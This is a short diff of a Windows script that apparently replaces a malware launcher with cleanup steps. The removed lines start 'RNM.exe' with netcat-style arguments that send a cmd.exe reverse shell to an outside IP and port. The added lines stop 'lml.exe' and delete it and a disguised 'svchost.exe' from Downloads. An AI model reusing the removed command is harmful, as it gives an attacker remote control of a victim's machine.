@@ -1,3 +1,7 @@
-taskkill /F /IM lml.exe
-C:\Users\Rodrigo\Downloads\lml.exe
-Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv 193.161.193.99 47524 -e cmd.exe"
+Stop-Process -Name lml -Force -ErrorAction SilentlyContinue
+
+attrib -h -s "$env:USERPROFILE\Downloads\lml.exe" -ErrorAction SilentlyContinue
+attrib -h -s "$env:USERPROFILE\Downloads\svchost.exe" -ErrorAction SilentlyContinue
+
+Remove-Item "$env:USERPROFILE\Downloads\lml.exe" -ErrorAction SilentlyContinue
+Remove-Item "$env:USERPROFILE\Downloads\svchost.exe" -ErrorAction SilentlyContinue
